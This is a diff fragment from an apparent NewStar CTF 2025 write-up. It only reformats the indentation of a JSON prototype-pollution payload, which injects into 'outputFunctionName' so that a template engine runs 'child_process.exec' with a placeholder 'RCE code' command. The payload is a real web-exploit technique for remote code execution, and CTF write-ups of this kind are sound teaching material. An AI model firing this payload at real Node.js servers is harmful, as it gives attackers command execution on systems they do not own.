@@ -22,14 +22,14 @@ titleTemplate: ":title | WriteUp - NewStar CTF 2025"
 
 ```json
 {
-    "content": {
-        "constructor": {
-            "prototype": {
-            "outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('RCE code');var __tmp2"
-            }
-        }
-    },
-    "type": "test"
+  "content": {
+    "constructor": {
+      "prototype": {
+        "outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('RCE code');var __tmp2"
+      }
+    }
+  },
+  "type": "test"
 }
 ```
 
